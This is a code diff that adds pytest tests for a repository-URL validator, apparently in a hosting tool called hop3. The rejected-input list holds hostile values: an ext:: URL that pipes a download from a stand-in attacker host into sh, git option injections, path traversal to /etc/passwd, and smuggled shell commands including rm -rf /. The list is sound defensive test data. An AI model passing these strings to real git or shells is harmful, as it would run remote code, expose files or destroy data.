@@ -14,6 +14,7 @@ from hop3.core.identifiers import (
     validate_env_var_key,
     validate_hostname,
     validate_hostname_list,
+    validate_repo_url,
     validate_service_name,
 )
 
@@ -188,3 +189,58 @@ def test_validate_hostname_list_rejects_any_invalid_host() -> None:
 def test_validate_hostname_list_rejects_empty_string() -> None:
     with pytest.raises(InvalidIdentifierError):
         validate_hostname_list(",")
+
+
+# ---------------------------------------------------------------------------
+# Repository URL
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://github.com/user/repo.git",
+        "http://git.example.com/repo",
+        "ssh://git@example.com:2222/user/repo.git",
+        "git://example.com/repo.git",
+        "HTTPS://Example.COM/repo.git",
+        "git@github.com:user/repo.git",
+        "git@git.example.co.uk:~user/repo",
+        "https://user:token@example.com/repo.git",
+    ],
+)
+def test_validate_repo_url_accepts(url: str) -> None:
+    assert validate_repo_url(url) == url.strip()
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "",
+        "   ",
+        # ext:: runs the rest of the URL as a command.
+        "ext::sh -c 'curl evil.example.com | sh'",
+        "ext::ssh -o ProxyCommand=id %S example.com",
+        # file:// and bare paths read anything the hop3 user can read.
+        "file:///home/hop3/apps/other-app/src",
+        "/home/hop3/apps/other-app/src",
+        "../../etc/passwd",
+        # A leading dash is an option, not an address.
+        "--upload-pack=touch /tmp/pwned",
+        "-c core.sshCommand=id",
+        # Shell metacharacters have no business in a repository address.
+        "git@example.com:repo.git;id",
+        "git@example.com:repo.git $(id)",
+        "https://example.com/repo.git\nrm -rf /",
+    ],
+)
+def test_validate_repo_url_rejects(url: str) -> None:
+    with pytest.raises(InvalidIdentifierError):
+        validate_repo_url(url)
+
+
+def test_validate_repo_url_rejects_non_string() -> None:
+    with pytest.raises(InvalidIdentifierError):
+        validate_repo_url(None)
+    with pytest.raises(InvalidIdentifierError):
+        validate_repo_url(["https://example.com/repo.git"])
